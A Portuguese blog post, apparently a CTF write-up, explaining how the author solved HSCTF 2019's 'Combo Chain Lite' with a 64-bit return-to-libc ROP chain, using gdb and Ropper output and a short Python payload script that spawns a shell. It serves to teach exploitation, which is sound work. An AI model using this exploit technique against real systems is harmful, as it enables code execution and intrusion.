---
layout: post
title: Combo Chain Lite - [HSCTF 2019] - Return to libc x64
date: 2019-06-12 18:22
author: obrerodrigues
comments: true
categories: [CTFs]
tags: [Sem Categoria, exploits, rop]
---
Não consigo me recordar da descrição desse desafio mas citava algo com ROP (Return Oriented Programming). O achei divertido porque me relembrou das diferenças entre explorar um binário 32bits e um 64.

Antes de tudo, uma analisada no código fonte:
<script src="https://gist.github.com/brerodrigues/305d2fbf300852c17ba8eeab38391e96.js"></script>

Tava na cara que a linha 10 da função *vuln* ia estourar o espaço reservado para a variável *dest* se alguém passasse mais de 8 chars quando *gets* pedisse input do usuário. Um clássico buffer overflow.

No gdb, não foi necessária muita mágica para descobrir o quanto de espaço era preciso para sobreescrever o endereço de retorno da função:

```
run <<< $(python -c 'print "A"*16 + "BBBB"')
```

16 A's e 4 B's resultaram nisso:

```
Stopped reason: SIGSEGV
0x0000000042424242 in ?? ()
```

0x42, o programa tentou retornar para belos e maisculos B's.

Já desconfiava e tive certeza quando rodei o comando *checksec* e vi o bit NX setado. Nada de executar shellcode na stack dessa vez (o que não é SEMPRE impossível quando esse bit estiver setado, falo mais sobre isso um dia).

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Como visto no codigo fonte, o binário imprime o endereço de *system* a cada execução:

```
b@b ~/h> ./combo-chain-lite 
Here's your free computer: 0x7ffff7a33440
Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: 
```

Com o endereço da função system e um argumento bem localizado na stack, a gente consegue fazer system executar o comando */bin/sh*. Não se preocupe, vou explicar isso melhor.

O binário ajuda novamente e tem exatamente essa string passeando na memória. Conseguimos encontra-la usando o comando *find "/bin/sh"* no peda. Mas antes é necessário executar o programa, por isso setei um breakpoint em main.

```
gdb-peda$ b *main
Breakpoint 1 at 0x4011bf
gdb-peda$ run
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
combo-chain-lite : 0x402051 --> 0x68732f6e69622f ('/bin/sh')
combo-chain-lite : 0x403051 --> 0x68732f6e69622f ('/bin/sh')
            libc : 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')
```

Ah, com o endereço de system e bin/sh achei que bastava fazer o que fiz no [level6 do narnia](https://brerodrigues.github.io/ctfs/favorites/level-6-return-to-libc-overthewire-ctf-narnia-write-up). Se você não faz ideia do que é Return Oriented Programming, recomendo que passe lá, explico com uma maior paciência os detalhes sórdidos.

```
b@b ~/h> file combo-chain-lite 
combo-chain-lite: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c56cc6916b1933494d1cc55ae82dcaf1cdf6693d, for GNU/Linux 3.2.0, not stripped
```

Mas não era tão simples quanto em narnia. A diferença é que o binário é um ELF 64-bits. 
Após erroneamente tentar explorar a falha jogando o endereço de /bin/sh na stack e chamando system, percebi minha viagem.

Na arquitetura 64 bits uma função não recebe, simplesmente, parâmetros via stack. Primeiro eles são passados usando os registradores. E não é de qualquer jeito, existe uma ordem:
1.  RDI
2.  RSI
3.  RDX
4.  RCX
5.  R8
6.  R9

E a stack só é utilizada se houver a necessidade de mais parâmetros.

Sabendo que system precisa apenas de um parâmetro, que é o comando que será executado, seria só questão de passar o endereço de /bin/sh para RDI e pwned. Como fazer isso? Return Oriented Programming.

Sem a possibilidade de executar nosso próprio código, ROP dá a ideia de usar o código disponível no binário (chamam esses pedaços de código de *gadgets*) para manipular a memória do programa e executar o que queremos. Minha primeira tentativa, usando uma técnica conhecida como *Return-to-libc*, nada mais é do que Return Oriented Programming. É uma explicação rasa, no final do post deixarei uns links que vão mais a fundo.

Voltando ao desafio: como mandar o endereço de /bin/sh para RDI? Era necessário executar uma instrução que pegasse esse endereço da stack, tipo POP RDI, e depois o programa teria que chamar system.

Não é qualquer POP RDI que posso usar porque depois de pular para essa instrução, a execução vai continuar nos endereços seguintes. Não adianta fazer um POP RDI e logo depois vir um CALL printf e etc porque foderia com minha stack e o programa ia dar crash e nunca daria uma shell. Aí que entra o conceito de gadgets: um gadget, normalmente, é uma instrução acompanhada de um RET, que é a instrução que vai pegar da stack o endereço da próxima instrução a ser executada. Logo, pegando gadgets, a gente pode inserir na stack os endereços um após o outro e o programa vai sair executando ordenadamente feliz da vida. 
Fica tipo assim na stack: gadget1->gadget2->gadget3... E a execução fica: gadget1: POP RDI, RET -> gadget2: POP RSI, RET -> gadget3: POP RDX, RET... 

Para encontrar instruções aptas para fazer essa mágica usei uma bela ferramente chamada [Ropper](https://github.com/sashs/Ropper). Ele automatiza essa busca.

Com o comando *./Ropper.py --file ../combo-chain-lite --search "% ?di"* recebo uma lista de gadgets que fazem operações com RDI ou EDI (por isso a "%?di" na busca). Vem uma caralhada de opções e em meio a elas encontro a perfeita:

```
0x0000000000401273: pop rdi; ret; 
```

Executando esse conjunto de instruções eu jogo algo da stack para RDI e retorno para a stack, onde vai ter o endereço da função system que irá ser chamada e achará em RDI o endereço de /bin/sh.

Meu exploit ficará alinhado na stack nessa ordem:
```
0x0000000000401273: pop rdi; ret; 
0x402051: /bin/sh
0x7ffff7a33440: system
```

Alterei minha rápida e nojenta PoC feita em python para formatar bonitinho os endereços e jogar num arquivo. Daí era só executar e passar como entrada para o binário e ganhar uma shell.

```
from struct import *

buf = ""
buf += "A"*16
buf += pack("<Q", 0x0000000000401273)       # pop rdi; ret;
buf += pack("<Q", 0x402051)                 # pointer to "/bin/sh" gets popped into rdi
buf += pack("<Q", 0x7ffff7a33440)           # address of system()

f = open("exploit", "w")
f.write(buf)
```

O segundo cat é para manter stdin aberta. Sem ele system chama /bin/sh e fecha logo depois.

```
$ (cat in.txt; cat) | ./combo-chain-lite 
Here's your free computer: 0x7ffff7a33440
Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: 
uname -a
Linux b 4.15.0-38-generic #41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Para explorar no CTF fiz um scriptizinho mais bonito. Usando o pwntools e tudo. Facilitou na hora de pegar o endereço de system que o binário manda na primeira linha. Pode observar na linha 12.

<script src="https://gist.github.com/brerodrigues/793458dddfdf3a18336302a1313b94f1.js"></script>

Links:
1. https://ctf101.org/binary-exploitation/return-oriented-programming/
2. https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/
